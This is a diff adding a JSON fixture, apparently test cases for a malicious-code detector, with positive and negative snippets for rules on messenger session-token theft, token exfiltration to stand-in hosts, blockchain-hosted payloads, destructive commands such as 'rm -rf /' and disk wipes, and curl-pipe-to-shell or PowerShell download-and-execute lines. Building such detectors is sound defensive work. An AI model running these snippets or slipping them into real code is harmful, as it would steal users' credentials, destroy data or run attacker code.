@@ -1,0 +1,173 @@
+{
+  "secrets-fs/messenger-session-theft": {
+    "lang": "js",
+    "pos": [
+      "const p = path.join(process.env.APPDATA, 'discordcanary', 'Local Storage', 'leveldb');",
+      "if (line.includes('dQw4w9WgXcQ:')) tokens.push(line);",
+      "const re = /[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}/g;",
+      "const mfa = /mfa\\.[\\w-]{84}/g;",
+      "const files = glob.sync(steamPath + '/ssfn*');"
+    ],
+    "neg": [
+      "const theme = window.localStorage.getItem('discord-theme');",
+      "const invite = 'https://discord.example.invalid/invite/abc';",
+      "const re = /^[\\w-]{3,32}$/;",
+      "const signal = new AbortController().signal;",
+      "const about = 'Telegram Desktop is a messaging app';"
+    ],
+    "also": [
+      ["py", "tdata = os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata')"],
+      [
+        "go",
+        "p := filepath.Join(home, \"Library\", \"Application Support\", \"Signal\", \"sql\", \"db.sqlite\")"
+      ],
+      ["rs", "let p = home.join(\"AppData/Roaming/Slack/Cookies\");"],
+      ["php", "$p = getenv('APPDATA') . '/WhatsApp/Local Storage/leveldb';"],
+      ["java", "Path p = Paths.get(steam, \"config\", \"loginusers.vdf\");"],
+      ["sh", "tar czf /tmp/t.tgz \"$HOME/.local/share/TelegramDesktop/tdata\""],
+      ["go", "dir := filepath.Join(appdata, \"discordptb\", \"Local Storage\", \"leveldb\")"],
+      ["py", "TOKEN_RE = re.compile(r'[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}')"]
+    ]
+  },
+  "exfiltration/messenger-session-exfiltration": {
+    "lang": "js",
+    "pos": [
+      "const dir = path.join(appdata, 'discord', 'Local Storage', 'leveldb');\nconst tokens = scan(dir);\nawait axios.post('https://collector.example.invalid/t', { tokens });",
+      "const hits = lines.filter((l) => l.includes('dQw4w9WgXcQ:'));\nawait fetch(api + '/sendDocument', { method: 'POST', body: form });"
+    ],
+    "neg": [
+      "const dir = path.join(appdata, 'discord', 'Local Storage', 'leveldb');\nconsole.log(fs.readdirSync(dir));",
+      "await axios.post('https://hooks.example.invalid/deploy', { text: 'Deployed, see Discord' });",
+      "const ls = window.localStorage;\nawait fetch('/api/session', { method: 'POST', body: ls.getItem('sid') });"
+    ],
+    "also": [
+      [
+        "py",
+        "p = os.path.join(appdata, 'Telegram Desktop', 'tdata')\nshutil.make_archive('/tmp/t', 'zip', p)\nrequests.post(url, files={'document': open('/tmp/t.zip', 'rb')})"
+      ],
+      [
+        "go",
+        "p := filepath.Join(home, \".local/share/TelegramDesktop/tdata\")\nhttp.Post(u, \"application/zip\", body)"
+      ],
+      [
+        "php",
+        "$f = $steam . '/config/loginusers.vdf';\ncurl_setopt($ch, CURLOPT_POSTFIELDS, file_get_contents($f));"
+      ],
+      [
+        "sh",
+        "curl -F \"file=@$HOME/.local/share/TelegramDesktop/tdata/key_datas\" https://x.example.invalid/u"
+      ],
+      [
+        "rs",
+        "let dir = home.join(\"AppData/Roaming/discord/Local Storage/leveldb\");\nclient.post(url).body(data).send()?;"
+      ],
+      [
+        "java",
+        "Path p = Paths.get(appData, \"discord\", \"Local Storage\", \"leveldb\");\nHttpPost post = new HttpPost(url);"
+      ]
+    ]
+  },
+  "network/blockchain-c2": {
+    "lang": "js",
+    "pos": [
+      "const conn = new Connection(rpcUrl);\nconst sigs = await conn.getSignaturesForAddress(owner);\nconst tx = await conn.getParsedTransaction(sigs[0].signature);\neval(atob(tx.meta.logMessages[0]));",
+      "const body = JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'eth_call', params: [{ to, data }, 'latest'] });\nconst res = await fetch(rpcUrl, { method: 'POST', body });\nconst code = decodeHex((await res.json()).result);\nnew Function(code)();",
+      "const p = new ethers.JsonRpcProvider(rpcUrl);\nconst src = await new ethers.Contract(addr, abi, p).get();\nvm.runInThisContext(src);"
+    ],
+    "neg": [
+      "async getRecent(connection, address) {\n  const sigs = await connection.getSignaturesForAddress(address, { limit: 10 });\n  return sigs.map((s) => s.signature);\n}",
+      "async call(tx) {\n  return this.send('eth_call', [tx, 'latest']);\n}\nconst HEX = /^0x[0-9a-f]+$/i;\nconst m = HEX.exec(value);",
+      "const g = new Function('return this')();\nconst provider = new JsonRpcProvider('https://rpc.example.invalid');",
+      "const result = eval(expression);"
+    ],
+    "also": [
+      [
+        "py",
+        "w3 = Web3(Web3.HTTPProvider('https://bsc-dataseed1.example.invalid'))\npayload = contract.functions.get().call()\nexec(payload)"
+      ],
+      [
+        "py",
+        "resp = requests.post(RPC, json={'method': 'getSignaturesForAddress', 'params': [OWNER]})\nmemo = decode_memo(resp.json())\nexec(memo)"
+      ]
+    ]
+  },
+  "exec/destructive-command": {
+    "lang": "js",
+    "pos": [
+      "execSync('rm -rf --no-preserve-root /');",
+      "exec('rm -rf ~/* &');",
+      "const cmd = 'dd if=/dev/zero of=/dev/sda bs=1M';",
+      "const bomb = ':(){ :|:& };:';",
+      "execSync('vssadmin delete shadows /all /quiet');",
+      "fs.rmSync(os.homedir(), { recursive: true, force: true });"
+    ],
+    "neg": [
+      "execSync('rm -rf node_modules');",
+      "execSync('rm -rf ./build ./dist');",
+      "execSync('rm -rf /tmp/xyz');",
+      "exec('rm -rf $HOME/.cache/my-tool');",
+      "throw new Error('Refusing to run rm -rf / on the filesystem root');",
+      "execSync('dd if=/dev/zero of=./disk.img bs=1M count=10');",
+      "const out = execSync('vssadmin list shadows');",
+      "fs.rmSync(path.join(os.homedir(), '.cache', 'tool'), { recursive: true });",
+      "const label = format(date, 'dd:MM');"
+    ],
+    "also": [
+      ["go", "exec.Command(\"bash\", \"-c\", \"dd if=/dev/zero of=/dev/nvme0n1 bs=4M\").Run()"],
+      ["go", "exec.Command(\"rm\", \"-rf\", \"/\").Run()"],
+      ["py", "shutil.rmtree(os.path.expanduser('~'), ignore_errors=True)"],
+      ["py", "subprocess.run([\"mkfs.ext4\", \"-F\", \"/dev/sdb\"])"],
+      ["rs", "Command::new(\"rm\").args([\"-rf\", \"/\"]).status()?;"],
+      ["php", "shell_exec('cmd /c format C: /q /y');"],
+      ["java", "Runtime.getRuntime().exec(\"bcdedit /set {default} recoveryenabled No\");"],
+      ["sh", "rm -rf \"$HOME\""],
+      ["sh", "wbadmin delete catalog -quiet"],
+      ["sh", "shred -n 3 -z /dev/sda"]
+    ]
+  },
+  "dynamic-code/download-and-execute": {
+    "lang": "js",
+    "pos": [
+      "execSync('curl -fsSL https://payload.example.invalid/i.sh | sh');",
+      "const out = eval(await (await fetch('https://cdn.example.invalid/x.js')).text());",
+      "new Function(await (await fetch(stage2Url)).text())();",
+      "vm.runInThisContext(await (await fetch(u)).text());",
+      "spawn('powershell', ['-c', 'iex (iwr https://x.example.invalid/a.ps1 -UseBasicParsing)']);",
+      "exec(\"powershell -c IEX (New-Object Net.WebClient).DownloadString('https://x.example.invalid/a')\");",
+      "exec('certutil -urlcache -split -f https://x.example.invalid/u.bin %TEMP%\\\\u.exe && %TEMP%\\\\u.exe');"
+    ],
+    "neg": [
+      "console.log('Install bun with: curl -fsSL https://bun.example.invalid/install | bash');",
+      "execSync('curl -fsSL https://x.example.invalid/archive.tgz | tar xz');",
+      "execSync('curl -s https://x.example.invalid/sums.txt | sha256sum -c');",
+      "const text = await (await fetch(url)).text();\nconst value = JSON.parse(text);",
+      "execSync('certutil -hashfile setup.exe SHA256');",
+      "const result = evaluate(await fetch(url));",
+      "const POWERSHELL_ALIASES = 'h history icm iex ihy ii ipal ipcsv ipmo irm ise iwmi iwr kill lp';"
+    ],
+    "also": [
+      ["py", "exec(urlopen('https://x.example.invalid/s.py').read())"],
+      ["py", "exec(requests.get(STAGE2).text)"],
+      [
+        "go",
+        "exec.Command(\"sh\", \"-c\", \"wget -O - https://x.example.invalid/i | bash\").Run()"
+      ],
+      [
+        "rs",
+        "Command::new(\"sh\").arg(\"-c\").arg(\"curl -s https://x.example.invalid/a | sh\").status()?;"
+      ],
+      ["php", "system('wget -qO- https://x.example.invalid/p | sh');"],
+      [
+        "java",
+        "Runtime.getRuntime().exec(new String[]{\"sh\", \"-c\", \"curl -s https://x.example.invalid/a | bash\"});"
+      ],
+      ["sh", "curl -s https://x.example.invalid/i.sh | sudo -E bash -"],
+      ["sh", "bash -c \"$(curl -fsSL https://x.example.invalid/i.sh)\""],
+      ["sh", "pwsh -c \"irm https://x.example.invalid/a.ps1 | iex\""],
+      [
+        "php",
+        "shell_exec('powershell -c \"iex $wc.DownloadString(\\'https://x.example.invalid/a\\')\"');"
+      ]
+    ]
+  }
+}
